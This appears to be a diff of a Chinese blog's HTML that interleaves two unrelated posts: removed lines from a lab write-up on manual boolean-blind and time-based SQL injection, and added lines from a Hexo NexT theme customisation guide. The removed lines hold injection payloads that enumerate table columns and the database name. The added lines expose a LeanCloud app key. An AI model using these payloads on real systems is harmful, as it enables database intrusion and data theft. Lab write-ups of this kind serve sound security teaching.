+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> page.copyright %&#125;</span><br><span class="line">&lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"post-copyright"</span>&gt;</span><br><span class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"post-copyright-author"</span>&gt;</span><br><span class="line">    &lt;strong&gt;本文标题:<span class="xml"><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span></span><br><span class="line">    &lt;a href=<span class="string">"&#123;&#123; url_for(page.path) &#125;&#125;"</span>&gt;&#123;&#123; page.title &#125;&#125;&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>li&gt;</span><br><span class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"post-copyright-author"</span>&gt;</span><br><span class="line">    &lt;strong&gt;&#123;&#123; __(<span class="string">'post.copyright.author'</span>) + __(<span class="string">'symbol.colon'</span>) &#125;&#125;&lt;<span class="regexp">/strong&gt;</span></span><br><span class="line"><span class="regexp">    &#123;&#123; config.author &#125;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>li&gt;</span><br><span class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"post-copyright-author"</span>&gt;</span><br><span class="line">    &lt;strong&gt;发布时间:<span class="xml"><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span></span><br><span class="line">    &#123;&#123; page.date.format(<span class="string">"YYYY年MM月DD日 - HH:MM"</span>) &#125;&#125;</span><br><span class="line">  &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;li class="post-copyright-author"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;strong&gt;最后更新:&lt;/</span>strong&gt;</span><br><span class="line">    &#123;&#123; page.updated.format(<span class="string">"YYYY年MM月DD日 - HH:MM"</span>) &#125;&#125;</span><br><span class="line">  &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  &lt;li class="post-copyright-link"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;strong&gt;&#123;&#123; __('post.copyright.link') + __('symbol.colon') &#125;&#125;&lt;/</span>strong&gt;</span><br><span class="line">    &lt;a href=<span class="string">"&#123;&#123; post.permalink &#125;&#125;"</span> title=<span class="string">"&#123;&#123; post.title &#125;&#125;"</span>&gt;&#123;&#123; post.permalink &#125;&#125;&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>li&gt;</span><br><span class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"post-copyright-license"</span>&gt;</span><br><span class="line">    &lt;strong&gt;&#123;&#123; __(<span class="string">'post.copyright.license_title'</span>) + __(<span class="string">'symbol.colon'</span>) &#125;&#125; &lt;<span class="regexp">/strong&gt;</span></span><br><span class="line"><span class="regexp">    &#123;&#123; __('post.copyright.license_content', theme.post_copyright.license_url, theme.post_copyright.license) &#125;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>li&gt;</span><br><span class="line">&lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">&#123;% endif %&#125;</span></span><br></pre></td></tr></table></figure>
 <ul>
-<li><p>猜测student表的字段数</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span>)=<span class="number">1</span><span class="comment"># =&gt; false</span></span><br><span class="line"><span class="number">1</span><span class="string">' and (select count(column_name) from information_schema.columns where table_name='</span>student<span class="string">')=3# =&gt; true</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>猜测student表的每一列长度</p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span><span class="comment"># =&gt; false</span></span><br><span class="line"><span class="number">1</span><span class="string">' and length(substr((select column_name from information_schema.columns where table_name='</span>student<span class="string">' limit 0,1),1))=2# =&gt; true</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>第一列列名长度为2</p>
-</blockquote>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span><span class="comment"># =&gt; false</span></span><br><span class="line"><span class="number">1</span><span class="string">' and length(substr((select column_name from information_schema.columns where table_name='</span>student<span class="string">' limit 1,1),1))=4# =&gt; true</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>第二列列名长度为4</p>
-</blockquote>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and length(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">1</span><span class="comment"># =&gt; false</span></span><br><span class="line"><span class="number">1</span><span class="string">' and length(substr((select column_name from information_schema.columns where table_name='</span>student<span class="string">' limit 2,1),1))=5# =&gt; true</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>第三列列名长度为5</p>
-</blockquote>
-</li>
-<li><p>猜测student表的每一列列名</p>
-<blockquote>
-<p>用猜测表名的方法进行猜测</p>
-</blockquote>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1' and ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span><span class="comment"># =&gt; true</span></span><br><span class="line"><span class="number">1</span><span class="string">' and ascii(substr((select column_name from information_schema.columns where table_name='</span>student<span class="string">' limit 0,1),1,1))&lt;122# =&gt; true</span></span><br><span class="line"><span class="string">……………………</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>用这种方法就可以将每个表名猜出，依次为id,name,score</p>
-</blockquote>
-</li>
+<li>自定义文章的默认头部信息</li>
 </ul>
-</li>
-</ol>
-</li>
-</ul>
+<p>在根目录的<code>/scaffolds/post.md</code>文件中添加：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">tags:                #标签</span><br><span class="line">categories:      #分类</span><br><span class="line">copyright: true #版权声明</span><br><span class="line">permalink: 01  #文章链接，有默认值</span><br><span class="line">top: 0              #置顶优先级</span><br><span class="line">password:      #密码保护</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
 <ul>
-<li><p>这一小问在上一问的基础上加入了随机字符串</p>
-<ul>
-<li>然而针对上一问的手工盲注方法对这一问同样有效<img src="/网络安全实验/网络对抗原理实验一/b9.png" alt="coin"><br>  <img src="/网络安全实验/网络对抗原理实验一/b10.png" alt="coin"></li>
-<li>我推测这种方法应该是为了防sqlmap，让其对返回值的true or false难以检测</li>
-<li>后来查阅了一下资料发现是为了模拟正常业务，因为正常情况下页面回显是需要自己去找的。</li>
+<li>文章加密访问(其实可以不用)</li>
 </ul>
+<p>打开主题目录下<code>layout/_partials/head.swig</code>文件,在<code>meta</code>标签后面插入这样一段代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'&#123;&#123; page.password &#125;&#125;'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (prompt(<span class="string">'请输入文章密码'</span>) !== <span class="string">'&#123;&#123; page.password &#125;&#125;'</span>)&#123;</span><br><span class="line">                alert(<span class="string">'密码错误！'</span>);</span><br><span class="line">                history.back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后文章头部信息中添加password：</p>
+<p>password: 你设置的密码</p>
+<p>如果password后面为空，则表示不用密码。</p>
+<ul>
+<li>博文置顶</li>
+</ul>
+<p><strong>安装hexo-generator-index插件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-index--save</span><br></pre></td></tr></table></figure>
+<p><strong>替换代码</strong></p>
+<p>把<code>node_modules/hexo-generator-index/lib/generator.js</code>内的代码替换为：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"><span class="keyword">var</span> pagination = <span class="built_in">require</span>(<span class="string">'hexo-pagination'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">locals</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = <span class="keyword">this</span>.config;</span><br><span class="line">  <span class="keyword">var</span> posts = locals.posts;</span><br><span class="line">    posts.data = posts.data.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a.top &amp;&amp; b.top) &#123; <span class="comment">// 两篇文章top都有定义</span></span><br><span class="line">            <span class="keyword">if</span>(a.top == b.top) <span class="keyword">return</span> b.date - a.date; <span class="comment">// 若top值一样则按照文章日期降序排</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> b.top - a.top; <span class="comment">// 否则按照top值降序排</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a.top &amp;&amp; !b.top) &#123; <span class="comment">// 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233）</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!a.top &amp;&amp; b.top) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> b.date - a.date; <span class="comment">// 都没定义按照文章日期降序排</span></span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="keyword">var</span> paginationDir = config.pagination_dir || <span class="string">'page'</span>;</span><br><span class="line">  <span class="keyword">return</span> pagination(<span class="string">''</span>, posts, &#123;</span><br><span class="line">    perPage: config.index_generator.per_page,</span><br><span class="line">    layout: [<span class="string">'index'</span>, <span class="string">'archive'</span>],</span><br><span class="line">    format: paginationDir + <span class="string">'/%d/'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      __index: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>设置top值</strong></p>
+<p>在文章头部信息中添加<code>top</code>值，数值越大文章越靠前:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">top: 100</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+<ul>
+<li>增强文章底部标签</li>
+</ul>
+<p>修改模板<code>/themes/next/layout/_macro/post.swig</code>，搜索 <code>rel=”tag”&gt;#</code>，将 <code>#</code>换成</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;i <span class="class"><span class="keyword">class</span></span>=<span class="string">"fa fa-tag"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>修改打赏</li>
+</ul>
+<p>在主题配置文件中找到如下行，并作出相应的修改，然后上传你的微信和支付宝二维码到博客根目录下的<code>source/img</code>文件夹中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 打赏设置</span><br><span class="line">reward_comment: 坚持原创技术分享，您的支持将鼓励我继续创作！</span><br><span class="line">wechatpay: /assets/img/weixin.jpg</span><br><span class="line">alipay: /assets/img/alipay.jpg</span><br><span class="line"># bitcoin: /images/bitcoin.png</span><br></pre></td></tr></table></figure>
+<ul>
+<li>字体不闪动设置</li>
+</ul>
+<p>修改文件<code>next/source/css/_common/components/post/post-reward.styl</code>，然后注释其中的函数<code>wechat:hover</code>和<code>alipay:hover</code>，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* 注释文字闪动函数</span><br><span class="line">#wechat:hover p&#123;</span><br><span class="line">animation: roll 0.1s infinite linear;</span><br><span class="line">-webkit-animation: roll 0.1s infinite linear;</span><br><span class="line">-moz-animation: roll 0.1s infinite linear;</span><br><span class="line">&#125;</span><br><span class="line">#alipay:hover p&#123;</span><br><span class="line">animation: roll 0.1s infinite linear;</span><br><span class="line">-webkit-animation: roll 0.1s infinite linear;</span><br><span class="line">-moz-animation: roll 0.1s infinite linear;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<ul>
+<li>添加顶部加载条</li>
+</ul>
+<p>在主题配置文件<code>_config.yml</code>中，找到<code>pace</code>并修改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pace: true</span><br><span class="line">pace_theme: pace-theme-minimal</span><br></pre></td></tr></table></figure>
+<p>加载条样式有许多，在你找到的位置中可自行更换</p>
+<ul>
+<li>主页文章添加阴影效果</li>
+</ul>
+<p>打开<code>/themes/next/source/css/_custom/custom.styl</code>,添加：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.post</span> &#123;</span><br><span class="line">   <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">   <span class="attribute">-webkit-box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(202, 203, 203, .5);</span><br><span class="line">   <span class="attribute">-moz-box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(202, 203, 204, .5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>给背景添加蜂窝状动画</li>
+</ul>
+<p>添加下列代码到你的布局文件中的标签之前（位置<code>/layout/layout.ejs</code>）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>在引用的同时可以对 <code>Nest</code> 进行相关的配置</p>
+<p><code>color</code> ： 线条颜色, 默认: ‘0,0,0’ ；三个数字分别为(R,G,B)，注意用,分割</p>
+<p><code>opacity</code> : 线条透明度（0~1）, 默认: 0.5</p>
+<p><code>count</code> : 线条的总数量, 默认: 150，（建议修改少点，否者 cpu 占用过高）</p>
+<p><code>zIndex</code> : 背景的z-index属性，css属性用于控制所在层的位置, 默认: -1</p>
+<p>例如</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> color=<span class="string">"0,0,255"</span> opacity=<span class="string">'0.7'</span> zIndex=<span class="string">"-2"</span> count=<span class="string">"99"</span> src=<span class="string">"//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>搜索功能</li>
+</ul>
+<p><strong>安装</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
+<p><strong>配置</strong></p>
+<p>在主题配置文件下，查找<code>local_search</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: false</span><br><span class="line">  trigger: auto</span><br><span class="line">  top_n_per_article: 1</span><br></pre></td></tr></table></figure>
+<p><code>enable</code>修改为<code>true</code></p>
+<p>在根目录配置文件中，添加以下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure>
+<ul>
+<li>页脚美化</li>
+</ul>
+<p><strong>隐藏网页底部 powered By Hexo 强力驱动</strong></p>
+<p>在主题配置文件<code>_config.yml</code>中修改：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copyright: false</span><br></pre></td></tr></table></figure>
+<ul>
+<li>侧边栏添加访问量等信息</li>
+</ul>
+<p><strong>获取不蒜子代码</strong></p>
+<p>在不蒜子上获取代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script <span class="keyword">async</span> src=<span class="string">"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>添加js文件</strong></p>
+<p>在主题目录下，找到<code>/layout/_layout.swig</code>文件， 在文件的后面，<code>&lt;/body&gt;</code>标签之前，添加上面代码。</p>
+<p><strong>安装wordcount</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure>
+<p><strong>修改布局</strong></p>
+<p>在主题目录下，找到<code>/layout/_macro/sidebar.swig</code>文件，查找<code>/nav</code>，在<code>&lt;/nav&gt;</code>标签之前，添加下面代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"site-state-item site-state-posts"</span> style=<span class="string">"border-left:none;"</span>&gt;</span><br><span class="line">       &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"site-state-item-count"</span> id=<span class="string">"busuanzi_value_site_pv"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">       &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"site-state-item-name"</span>&gt;浏览量&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"site-state-item site-state-posts"</span>&gt;</span><br><span class="line">      &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"site-state-item-count"</span> id=<span class="string">"busuanzi_value_site_uv"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">     &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"site-state-item-name"</span>&gt;访客量&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"site-state-item site-state-posts"</span>&gt;</span><br><span class="line">      &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"site-state-item-count"</span>&gt;&#123;&#123;totalcount(site)&#125;&#125;&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">      &lt;span class="site-state-item-name"&gt;总字数&lt;/</span>span&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>文章标签显示设置</li>
+</ul>
+<p>在主题配置文件中，查找<code>post_meta</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 文章标签显示设置</span><br><span class="line">post_meta:</span><br><span class="line">  item_text: true</span><br><span class="line">  created_at: true  # 发表时间</span><br><span class="line">  updated_at: false  # 更新时间</span><br><span class="line">  categories: true  # 分类</span><br><span class="line"></span><br><span class="line"># 文章字数显示设置（需要wordcount，前面已经下载）</span><br><span class="line">post_wordcount:</span><br><span class="line">  item_text: true</span><br><span class="line">  wordcount: true  # 显示字数</span><br><span class="line">  min2read: false   # 所需时间</span><br><span class="line">  totalcount: false  # 总字数</span><br><span class="line">  separated_meta: true # 分割符</span><br></pre></td></tr></table></figure>
+<ul>
+<li>文章阅读量</li>
+</ul>
+<p>注册<code>leancloud</code>统计账号，按照<code>next</code>官方推荐文档 为<code>NexT</code>主题添加文章阅读量统计功能，获取<code>AppID</code>以及<code>AppKey</code>并在主题的<code>_config.yml</code>文件中填写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">leancloud_visitors:</span><br><span class="line">  enable: true</span><br><span class="line">  app_id: joaeuuc4hsqudUUwx4gIvGF6-gzGzoHsz</span><br><span class="line">  app_key: E9UJsJpw1omCHuS22PdSpKoh</span><br></pre></td></tr></table></figure>
+<ul>
+<li>添加友言评论</li>
+</ul>
+<p>在友言评论中注册，并进入管理来获取你的id。<br>修改主题配置文件的友言id：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># youyan 评论</span><br><span class="line">youyan_uid: &quot;2144889&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>添加jiathis分享按钮</li>
+</ul>
+<p>将你的友言Id添加进去：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># jiathis 分享按钮</span><br><span class="line">jiathis:</span><br><span class="line">  uid: &apos;2144889&apos;</span><br></pre></td></tr></table></figure>
+<h1 id="参考资料以及FAQ"><a href="#参考资料以及FAQ" class="headerlink" title="参考资料以及FAQ"></a>参考资料以及FAQ</h1><ol>
+<li><p>ubuntu下搭建LAMP环境</p>
+<p> <a href="https://blog.csdn.net/lu_embedded/article/details/79604380" target="_blank" rel="noopener">https://blog.csdn.net/lu_embedded/article/details/79604380</a></p>
 </li>
-<li><p>下一小问只是在查询语句中加入了<code>AND score&gt;60</code>，这样的话只要填上闭合向量’#’就可以过滤掉后面的WHERE条件判定</p>
+<li><p>ubuntu创建自签名证书</p>
+<p> <a href="https://www.howtoing.com/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04" target="_blank" rel="noopener">https://www.howtoing.com/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04</a></p>
 </li>
-<li><p>对于固定输出的内容就不能用盲注了，因为我们不能得到true or false，所以只能用基于时间的注入攻击</p>
-<ol>
-<li><p>先判断是否有注入点</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and sleep(2)<span class="comment"># =&gt;等待，有注入点</span></span><br></pre></td></tr></table></figure>
+<li><p>腾讯云安装<code>let&#39;s encrypt</code>证书</p>
+<p> <a href="https://www.howtoing.com/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04" target="_blank" rel="noopener">https://www.howtoing.com/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04</a></p>
 </li>
-<li><p>判断当前数据库名长度</p>
-<p> <strong>TIPS</strong>：sleep（n） 语句：使数据库在暂停n秒之后再将搜索结果输出；if（（条件），m，n）语句：若条件为真 返回m，若条件为假 返回n；</p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1'  and sleep(if((length(database())=1),3,0))<span class="comment"># =&gt;不等待</span></span><br><span class="line">1'  and sleep(if((length(database())=2),3,0))<span class="comment"># =&gt;不等待</span></span><br><span class="line">1'  and sleep(if((length(database())=3),3,0))<span class="comment"># =&gt;不等待</span></span><br><span class="line">1'  and sleep(if((length(database())=4),3,0))<span class="comment"># =&gt;等待</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>则数据库名长度为4</p>
-</blockquote>
+<li><p>安装Next主题</p>
+<p> <a href="http://theme-next.iissnan.com/getting-started.html#install-next-theme" target="_blank" rel="noopener">http://theme-next.iissnan.com/getting-started.html#install-next-theme</a></p>
 </li>
-<li><p>判断数据库名</p>
-<p> <strong>TIPS</strong>：<br> <code>mid(database(), m, n)</code>:返回数据库名的第m位之后的n位；</p>
